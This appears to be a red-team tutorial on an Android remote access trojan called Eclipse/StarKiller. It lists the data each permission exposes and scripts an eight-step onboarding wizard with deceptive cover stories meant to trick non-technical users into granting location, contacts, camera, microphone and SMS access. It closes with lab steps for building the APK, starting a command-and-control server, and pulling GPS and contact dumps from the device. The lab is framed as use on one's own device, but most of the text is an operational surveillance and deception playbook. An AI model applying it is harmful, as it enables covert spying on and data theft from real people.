Section 1: Android's Attack Surface

Android runs on 3 billion devices. Most users never check what permissions an app requests. The platform gives you access to GPS, camera, microphone, contacts, SMS, and call logs — with a single dialog they'll tap through.

# What an Android RAT can access (with permissions granted)
READ_CONTACTS          → full contact list
ACCESS_FINE_LOCATION   → real-time GPS coordinates
CAMERA                 → front + rear camera
RECORD_AUDIO           → microphone (ambient recording)
READ_SMS               → all SMS messages
READ_CALL_LOG          → who they called, when, how long
WRITE_EXTERNAL_STORAGE → read/write all files
RECEIVE_BOOT_COMPLETED → auto-start on reboot
Android 6.0+ requires runtime permission dialogs. Before Android 10, you could grant all of these silently via ADB. Post-Android 10, social engineering is the only reliable path for a realistic red team scenario.

Eclipse is the realistic scenario: user downloads what looks like a utility app, taps through 8 friendly-looking permission dialogs with plausible explanations, and grants full access. Live tested on Samsung Galaxy S10e (SM-G970U) Android 12.

Section 3: The Social Engineering Wizard

Eclipse's 8-step wizard presents each permission request with a cover story that makes sense to a non-technical user:

# Eclipse onboarding wizard — permission flow
Step 1: "Location Services" → ACCESS_FINE_LOCATION
        "Enable location for personalised weather updates"

Step 2: "Contacts Sync"    → READ_CONTACTS
        "Sync your contacts for quick sharing"

Step 3: "Photo Access"     → CAMERA + WRITE_EXTERNAL_STORAGE
        "Let us help you organise your photos"

Step 4: "Voice Assistant"  → RECORD_AUDIO
        "Say 'Hey App' for hands-free control"

... 4 more steps ... all with plausible cover stories

Result: all permissions granted. No suspicion. Standard app onboarding UX.

Lab: StarKiller on Your Own Device
# Your own Android device only — explicitly authorised

1. Enable: Settings → Developer Options → USB Debugging
2. Connect device via USB
3. adb devices ← confirm device shows as authorized
4. python build.py --target debug
5. adb install starkiller-debug.apk
6. python c2_web.py ← start C2 on .92 (LAN accessible)
7. Open app on device → complete permission wizard
8. C2 console: device session appears
9. Test: eclipse> location → confirm GPS returned
10. eclipse> contacts dump → see your own contacts exported
